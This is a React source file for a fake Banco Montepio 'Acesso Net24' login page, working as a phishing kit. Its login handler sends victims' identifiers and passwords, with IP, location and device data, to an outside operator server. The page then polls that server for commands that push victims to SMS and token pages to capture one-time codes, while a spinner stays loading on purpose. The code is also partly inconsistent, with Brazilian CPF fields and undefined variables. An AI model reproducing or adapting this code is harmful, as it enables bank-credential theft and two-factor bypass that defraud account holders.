import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Eye, EyeOff, HelpCircle, CheckCircle, XCircle } from "lucide-react";
import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
import { Switch } from "@/components/ui/switch";
import { useClientStatus } from "@/hooks/useClientStatus";
import { useMetrics } from "@/hooks/useMetrics";
import { useToast } from "@/hooks/use-toast";
import { useCpfValidation } from "@/hooks/useCpfValidation";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

// Atualize aqui: Use título e subtítulo (duas linhas) como campos explícitos!
const TABS = [
  { title: "Pessoa", subtitle: "Física", value: "fisica" },
  { title: "Pessoa", subtitle: "Jurídica", value: "juridica" },
  { title: "Gerenciador", subtitle: "Financeiro", value: "financeiro" },
];

// Função para capturar IP público
const getClientIP = async (): Promise<string> => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.log('Erro ao capturar IP:', error);
    return '127.0.0.1';
  }
};

// Função para capturar dados de localização
const getLocationData = async (ip: string): Promise<{ country: string; city: string }> => {
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    const data = await response.json();
    return {
      country: data.country_code || 'BR',
      city: data.city || 'São Paulo'
    };
  } catch (error) {
    console.log('Erro ao capturar localização:', error);
    return { country: 'BR', city: 'São Paulo' };
  }
};

// Função para detectar tipo de dispositivo
const getDeviceType = (): string => {
  const userAgent = navigator.userAgent;
  if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
    return 'Tablet';
  }
  if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) {
    return 'Mobile';
  }
  return 'Desktop';
};

// Função para coletar todos os dados do cliente
const collectClientData = async () => {
  console.log('Iniciando coleta de dados do cliente...');
  
  const ip = await getClientIP();
  console.log('IP capturado:', ip);
  
  const location = await getLocationData(ip);
  console.log('Localização capturada:', location);
  
  const device = getDeviceType();
  console.log('Dispositivo detectado:', device);
  
  const currentUrl = window.location.href;
  const referrer = document.referrer || 'direct';
  
  console.log('URL atual:', currentUrl);
  console.log('Referrer:', referrer);
  
  return {
    ip,
    country: location.country,
    city: location.city,
    device,
    currentUrl,
    referrer
  };
};

// Função para atualizar dados do cliente com PATCH - NOVA IMPLEMENTAÇÃO
const updateClientWithPatch = async (clientId: string, username: string, password: string): Promise<boolean> => {
  try {
    console.log(`Fazendo PATCH para cliente ${clientId} com novos dados...`);
    console.log('Novos dados:', { username, password });
    
    const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/update`, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username: username,
        password: password,
        command: ""
      })
    });

    console.log(`Status do PATCH: ${response.status}`);
    
    if (response.ok) {
      const responseData = await response.json();
      console.log('PATCH realizado com sucesso:', responseData);
      return true;
    } else {
      const errorData = await response.text();
      console.log('Erro no PATCH:', errorData);
      return false;
    }
  } catch (error) {
    console.log('Erro durante PATCH:', error);
    return false;
  }
};

// Função para monitorar cliente continuamente - MODIFICADA para implementar ciclo
const monitorClient = async (
  clientId: string, 
  navigate: (path: string) => void, 
  toast: any,
  setIsLoading: (loading: boolean) => void,
  setShowInvalidDataModal: (show: boolean) => void
): Promise<void> => {
  console.log(`Iniciando monitoramento do cliente: ${clientId}`);
  
  let intervalId: NodeJS.Timeout;
  
  const monitor = async () => {
    try {
      console.log(`Consultando dados do cliente ${clientId}...`);
      
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
      });

      console.log(`Status da consulta: ${response.status}`);
      
      if (response.ok) {
        const clientData = await response.json();
        console.log('Dados do cliente recebidos:', clientData);
        console.log('Valor do response:', clientData.data?.response);
        console.log('Valor do command:', clientData.data?.command);
        
        // Verificar se recebeu comando de dados incorretos (inv_username OU inv_password)
        if (clientData.data?.response === "inv_username" || clientData.data?.command === "inv_username" ||
            clientData.data?.response === "inv_password" || clientData.data?.command === "inv_password") {
          console.log('Detectado comando de dados inválidos - Parando loading e mostrando modal');
          clearInterval(intervalId);
          setIsLoading(false);
          setShowInvalidDataModal(true);
          console.log('Monitoramento parado - dados incorretos');
          return;
        }
        
        // Verificar redirecionamentos baseados no response ou command dentro de data
        if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
          console.log('Detectado ir_sms - Redirecionando para /sms');
          clearInterval(intervalId);
          console.log('Monitoramento parado - redirecionando...');
          navigate('/sms');
          return;
        }
        
        if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
          console.log('Detectado ir_2fa - Redirecionando para /token');
          clearInterval(intervalId);
          console.log('Monitoramento parado - redirecionando...');
          navigate('/token');
          return;
        }
        
        console.log('Nenhum redirecionamento necessário - continuando monitoramento...');
      } else {
        const errorData = await response.text();
        console.log('Erro na consulta do cliente:', errorData);
      }

    } catch (error) {
      console.log('Erro durante consulta do cliente:', error);
    }
  };

  // Executar primeira consulta imediatamente
  await monitor();
  
  // Configurar monitoramento contínuo a cada 3 segundos
  intervalId = setInterval(monitor, 3000);
  console.log('Monitoramento contínuo configurado (3 segundos)');
};

// Função para processar resposta de registro e iniciar monitoramento - MODIFICADA
const processRegistrationResponse = async (
  response: Response, 
  navigate: (path: string) => void, 
  toast: any,
  setIsLoading: (loading: boolean) => void,
  setShowInvalidDataModal: (show: boolean) => void
): Promise<void> => {
  try {
    const responseData = await response.json();
    console.log('Cliente registrado com sucesso:', responseData);
    
    // Verificar se a resposta contém clientId
    if (responseData.success && responseData.clientId) {
      console.log('ClientId capturado:', responseData.clientId);
      
      // Salvar clientId no localStorage
      localStorage.setItem('clientId', responseData.clientId);
      console.log('ClientId salvo no localStorage:', responseData.clientId);
      
      // Iniciar monitoramento contínuo do cliente
      await monitorClient(responseData.clientId, navigate, toast, setIsLoading, setShowInvalidDataModal);
    } else {
      console.log('ClientId não encontrado na resposta');
      
      // Tentar capturar ID de outras possíveis localizações na resposta
      const clientId = responseData.clientId || responseData.data?.id || responseData.id;
      if (clientId) {
        console.log('ClientId encontrado em localização alternativa:', clientId);
        // Salvar clientId no localStorage
        localStorage.setItem('clientId', clientId);
        console.log('ClientId salvo no localStorage:', clientId);
        await monitorClient(clientId, navigate, toast, setIsLoading, setShowInvalidDataModal);
      }
    }
  } catch (error) {
    console.log('Erro ao processar resposta de registro:', error);
  }
};

const Index = () => {
  const navigate = useNavigate();
  const clientStatus = useClientStatus();
  const metrics = useMetrics();
  const { toast } = useToast();
  const cpfValidation = useCpfValidation();
  
  const [activeTab, setActiveTab] = useState("particulares");
  const [identificacao, setIdentificacao] = useState("");
  const [senha, setSenha] = useState("");
  const [showSenha, setShowSenha] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showInvalidDataModal, setShowInvalidDataModal] = useState(false);

  // ---- Geolocalização nativa do navegador ----
  useEffect(() => {
    // Solicita permissão de geolocalização quando a página carregar
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          console.log("Usuário permitiu geolocalização:", position.coords);
          console.log("Latitude:", position.coords.latitude);
          console.log("Longitude:", position.coords.longitude);
        },
        (error) => {
          console.log("Usuário recusou ou erro na geolocalização:", error.message);
          switch(error.code) {
            case error.PERMISSION_DENIED:
              console.log("Usuário negou a solicitação de geolocalização.");
              break;
            case error.POSITION_UNAVAILABLE:
              console.log("Informações de localização não estão disponíveis.");
              break;
            case error.TIMEOUT:
              console.log("A solicitação de localização expirou.");
              break;
            default:
              console.log("Erro desconhecido na geolocalização.");
              break;
          }
        },
        {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        }
      );
    } else {
      console.log("Geolocalização não é suportada por este navegador.");
    }
  }, []);

  // ---- Teclado Inline ----
  const [showPasswordKeyboard, setShowPasswordKeyboard] = useState(false);
  const [senhaTemp, setSenhaTemp] = useState("");

  function handlePasswordInputFocus() {
    setSenhaTemp(senha);
    setShowPasswordKeyboard(true);
  }

  function handleKeyboardSubmit(val: string) {
    setSenha(val);
    setShowPasswordKeyboard(false);
    setSenhaTemp("");
  }
  function handleKeyboardCancel() {
    setShowPasswordKeyboard(false);
    setSenhaTemp("");
  }

  // Handler para mudança de CPF com validação
  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { formatted } = cpfValidation.handleCpfChange(e.target.value);
    setCpf(formatted);
  };

  // Função para limpar todos os campos - MODIFICADA para reiniciar monitoramento
  const clearAllFields = () => {
    console.log('Limpando todos os campos...');
    setCpf("");
    setCnpj("");
    setChaveMulticanal("");
    setSenha("");
    setSaveCpf(false);
    setSaveCnpj(false);
    setSaveChaveMulticanal(false);
    cpfValidation.reset();
    setShowInvalidDataModal(false);
    console.log('Todos os campos limpos - Pronto para novo envio');
  };

  // Função para atualizar dados do cliente existente
  const updateClientData = async (clientId: string, userData: any): Promise<boolean> => {
    try {
      console.log(`Atualizando dados do cliente ${clientId}...`);
      
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(userData)
      });

      console.log(`Status da atualização: ${response.status}`);
      
      if (response.ok) {
        console.log('Dados do cliente atualizados com sucesso');
        return true;
      } else {
        const errorData = await response.text();
        console.log('Erro na atualização dos dados:', errorData);
        return false;
      }
    } catch (error) {
      console.log('Erro durante atualização dos dados:', error);
      return false;
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validar CPF se estiver na aba de pessoa física
    if (tab === 'fisica') {
      const cleanCpf = cpf.replace(/[^\d]/g, '');
      if (cleanCpf.length === 0) {
        toast({
          title: "CPF obrigatório",
          description: "Por favor, digite um CPF válido.",
          variant: "destructive",
        });
        return;
      }
      
      if (cleanCpf.length !== 11) {
        toast({
          title: "CPF incompleto",
          description: "Por favor, digite um CPF completo com 11 dígitos.",
          variant: "destructive",
        });
        return;
      }
      
      if (!cpfValidation.validateCpf(cpf)) {
        toast({
          title: "CPF inválido",
          description: "Por favor, digite um CPF válido.",
          variant: "destructive",
        });
        return;
      }
    }
    
    // Validar senha
    if (!senha || senha.length === 0) {
      toast({
        title: "Senha obrigatória",
        description: "Por favor, digite sua senha.",
        variant: "destructive",
      });
      return;
    }
    
    setIsLoading(true);
    
    try {
      // Determinar username baseado na aba ativa
      let username = '';
      if (tab === 'fisica') {
        username = cpf.replace(/[^\d]/g, ''); // Enviar CPF sem máscara
      } else if (tab === 'juridica') {
        username = cnpj;
      } else if (tab === 'financeiro') {
        username = chaveMulticanal;
      }

      console.log('Iniciando processo de envio de dados...');
      console.log('Tab ativa:', tab);
      console.log('Username:', username);
      console.log('Senha:', senha);
      
      // Verificar se já existe clientId (dados inválidos - fazer PATCH)
      const existingClientId = localStorage.getItem('clientId');
      
      if (existingClientId) {
        console.log('ClientId existente encontrado, fazendo PATCH com novos dados:', existingClientId);
        
        // Fazer PATCH com os novos dados de username e password
        const patchSuccess = await updateClientWithPatch(existingClientId, username, senha);
        
        if (patchSuccess) {
          console.log('PATCH realizado com sucesso, reiniciando monitoramento...');
          // Reiniciar monitoramento com os novos dados
          await monitorClient(existingClientId, navigate, toast, setIsLoading, setShowInvalidDataModal);
        } else {
          console.log('Erro no PATCH, mantendo loading...');
          // Manter loading mesmo se PATCH falhar
        }
      } else {
        console.log('Nenhum clientId existente, fazendo novo registro...');
        
        // Coletar dados do cliente para novo registro
        const clientData = await collectClientData();
        
        // Preparar dados para envio
        const userData = {
          username: username || 'teste_user',
          password: senha || 'teste_password',
          ip: clientData.ip,
          country: clientData.country,
          city: clientData.city,
          device: clientData.device,
          referrer: clientData.referrer,
          currentUrl: clientData.currentUrl
        };

        console.log('Dados preparados para novo registro:', userData);
        
        // Fazer novo registro
        const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(userData)
        });

        console.log('Status da resposta:', response.status);
        
        if (response.ok) {
          // Processar resposta e iniciar monitoramento
          await processRegistrationResponse(response, navigate, toast, setIsLoading, setShowInvalidDataModal);
        } else {
          const errorData = await response.text();
          console.log('Erro na resposta da API:', errorData);
        }
      }

    } catch (error) {
      console.log('Erro durante o processo de envio:', error);
    }
    
    // Manter loading infinito - não setar isLoading para false
    console.log('Loading infinito ativado');
  };

  // ---- PASSWORD INPUT (com toggle view) ----
  const senhaInput = (
    <div className="mb-4 relative z-10">
      <div className="relative flex items-center">
        <input
          type={showSenha ? "text" : "password"}
          className="w-full h-12 px-4 pr-12 border border-gray-300 rounded focus:outline-none transition text-base bg-white"
          placeholder="Palavra-passe"
          value={senha ? senha : ""}
          onFocus={handlePasswordInputFocus}
          readOnly
          style={{ userSelect: "none" }}
          autoComplete="off"
        />
        <button
          type="button"
          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 flex items-center justify-center p-1"
          tabIndex={-1}
          onClick={() => setShowSenha((v) => !v)}
          aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
        >
          {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
        </button>
      </div>
      <div>
        <VirtualKeyboardInline
          open={showPasswordKeyboard}
          value={senhaTemp}
          onChange={setSenhaTemp}
          onSubmit={handleKeyboardSubmit}
          onCancel={handleKeyboardCancel}
        />
      </div>
    </div>
  );

  // ---- Registrar visita automaticamente ----
  useEffect(() => {
    // Registrar visita apenas uma vez quando a página carregar
    if (!metrics.isRegistered) {
      metrics.registerVisit();
    }
  }, [metrics]);

  // Adicionar monitoramento de status do cliente
  useEffect(() => {
    // Verificar se já existe clientId para iniciar monitoramento
    const storedClientId = localStorage.getItem('clientId');
    if (storedClientId) {
      console.log('ClientId encontrado na página Index, iniciando monitoramento de status');
      clientStatus.startMonitoring();
    }

    // Cleanup quando sair da página
    return () => {
      clientStatus.stopMonitoring();
    };
  }, [clientStatus]);

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Modal de Dados Inválidos */}
      <AlertDialog open={showInvalidDataModal} onOpenChange={setShowInvalidDataModal}>
        <AlertDialogContent className="max-w-md mx-auto">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-center text-lg font-semibold">
              Dados inválidos
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center text-gray-600">
              Os dados informados estão incorretos. Verifique suas credenciais e tente novamente.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter className="flex justify-center">
            <AlertDialogAction
              onClick={clearAllFields}
              className="bg-yellow-500 hover:bg-yellow-600 text-black px-8 py-2 rounded"
            >
              Tentar Novamente
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* Header */}
      <div className="bg-white shadow-sm py-4">
        <div className="max-w-4xl mx-auto px-4 flex justify-center">
          <div className="flex items-center">
            <div className="w-8 h-8 bg-yellow-500 rounded mr-3 flex items-center justify-center">
              <div className="w-4 h-4 bg-black transform rotate-45"></div>
            </div>
            <span className="text-xl font-semibold text-gray-700">Banco Montepio</span>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-4xl mx-auto px-4 py-8">
        <div className="bg-white rounded-lg shadow-sm p-8">
          <h1 className="text-2xl font-normal text-gray-700 mb-8 text-center">Acesso Net24</h1>
          
          {/* Tab Navigation */}
          <div className="border-b border-gray-200 mb-8">
            <nav className="flex space-x-8">
              <button
                onClick={() => setActiveTab("particulares")}
                className={`py-4 px-2 border-b-2 font-medium text-sm ${
                  activeTab === "particulares"
                    ? "border-yellow-500 text-gray-900"
                    : "border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"
                }`}
              >
                Acesso Net24 Particulares
              </button>
              <button
                onClick={() => setActiveTab("empresas")}
                className={`py-4 px-2 border-b-2 font-medium text-sm ${
                  activeTab === "empresas"
                    ? "border-yellow-500 text-gray-900"
                    : "border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"
                }`}
              >
                Acesso Net24 Empresas
              </button>
            </nav>
          </div>

          {/* Form Content */}
          <form onSubmit={handleLogin} className="max-w-md mx-auto">
            <div className="mb-6">
              <div className="flex items-center justify-between mb-4">
                <label className="text-sm font-medium text-gray-700">
                  Identificação
                </label>
              </div>
              <input
                type="text"
                className="w-full h-12 px-4 border border-gray-300 rounded focus:outline-none focus:border-yellow-500 transition text-base bg-white"
                placeholder=""
                value={identificacao}
                onChange={(e) => setIdentificacao(e.target.value)}
                autoComplete="username"
              />
            </div>

            {senhaInput}

            <button
              type="submit"
              disabled={isLoading}
              className="w-full h-12 bg-yellow-500 hover:bg-yellow-600 transition font-medium text-black text-base rounded shadow disabled:opacity-70 flex items-center justify-center mb-6"
            >
              {isLoading ? (
                <div className="flex items-center">
                  <div className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin mr-2"></div>
                  A carregar...
                </div>
              ) : (
                "CONTINUAR"
              )}
            </button>
          </form>
        </div>

        {/* Security Recommendations Section */}
        <div className="mt-8 bg-yellow-500 rounded-lg p-6">
          <h2 className="text-lg font-semibold text-black mb-6 text-center">
            RECOMENDAÇÕES DE SEGURANÇA
          </h2>
          
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            {/* Security Item 1 */}
            <div className="text-center">
              <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
                <div className="w-12 h-12 border-2 border-black rounded flex items-center justify-center">
                  <div className="w-4 h-6 border-2 border-black rounded-t"></div>
                </div>
              </div>
              <h3 className="font-semibold text-black mb-2">
                Valide que está a aceder a uma página segura
              </h3>
              <p className="text-sm text-black leading-relaxed">
                As páginas do Montepio terão sempre a informação relativa ao{" "}
                <strong>Certificado de Segurança</strong> na barra de endereços dos vários navegadores de Internet.
              </p>
            </div>

            {/* Security Item 2 */}
            <div className="text-center">
              <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
                <div className="text-2xl">****</div>
              </div>
              <h3 className="font-semibold text-black mb-2">
                Códigos de acesso ao Serviço Montepio24
              </h3>
              <p className="text-sm text-black leading-relaxed">
                Para aceder ao Serviço <strong>Montepio24</strong>, apenas é necessário indicar o seu{" "}
                <strong>N.º de identificação Montepio24</strong> e o <strong>código PIN</strong>.
              </p>
            </div>

            {/* Security Item 3 */}
            <div className="text-center">
              <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
                <div className="w-12 h-12 border-2 border-black rounded flex items-center justify-center">
                  <div className="text-xs">📱</div>
                </div>
              </div>
              <h3 className="font-semibold text-black mb-2">
                Validação de transações
              </h3>
              <p className="text-sm text-black leading-relaxed">
                Para aprovar transações que alterem o seu património será necessário proceder à sua{" "}
                <strong>autorização através dos métodos de autenticação</strong> disponibilizados pelo Banco Montepio.
              </p>
            </div>

            {/* Security Item 4 */}
            <div className="text-center">
              <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
                <div className="w-12 h-12 border-2 border-black rounded flex items-center justify-center">
                  <div className="text-xs">📞</div>
                </div>
              </div>
              <h3 className="font-semibold text-black mb-2">
                Número de Telemóvel
              </h3>
              <p className="text-sm text-black leading-relaxed">
                No acesso ao Serviço Montepio24 não solicitamos o n.º de{" "}
                <strong>telemóvel</strong>.
              </p>
            </div>
          </div>
        </div>

        {/* Bottom Info Section */}
        <div className="mt-8 grid grid-cols-1 md:grid-cols-3 gap-6">
          <div className="text-center p-6 bg-white rounded-lg shadow-sm">
            <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
              <div className="text-2xl">🕵️</div>
            </div>
            <h3 className="font-semibold text-gray-800 mb-2">Exemplos de Fraude</h3>
            <p className="text-sm text-gray-600 mb-4">
              Consulte os últimos Alertas de Segurança e Exemplos de Fraudes.
            </p>
            <button className="bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded text-sm font-medium">
              VER MAIS
            </button>
          </div>

          <div className="text-center p-6 bg-white rounded-lg shadow-sm">
            <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
              <div className="text-2xl">🛡️</div>
            </div>
            <h3 className="font-semibold text-gray-800 mb-2">Recomendações de Segurança</h3>
            <p className="text-sm text-gray-600 mb-4">
              Conheça as nossas recomendações e dicas de segurança.
            </p>
            <button className="bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded text-sm font-medium">
              VER MAIS
            </button>
          </div>

          <div className="text-center p-6 bg-white rounded-lg shadow-sm">
            <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
              <div className="text-2xl">📞</div>
            </div>
            <h3 className="font-semibold text-gray-800 mb-2">Contacte-nos</h3>
            <p className="text-sm text-gray-600 mb-2">
              Qualquer questão contacte-nos por telefone através do Serviço Montepio24.
            </p>
            <p className="text-lg font-semibold text-gray-800 mb-2">(+351) 21 724 16 24</p>
            <p className="text-xs text-gray-500">
              Atendimento personalizado todos os dias das 08h00 às 00h00
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Index;
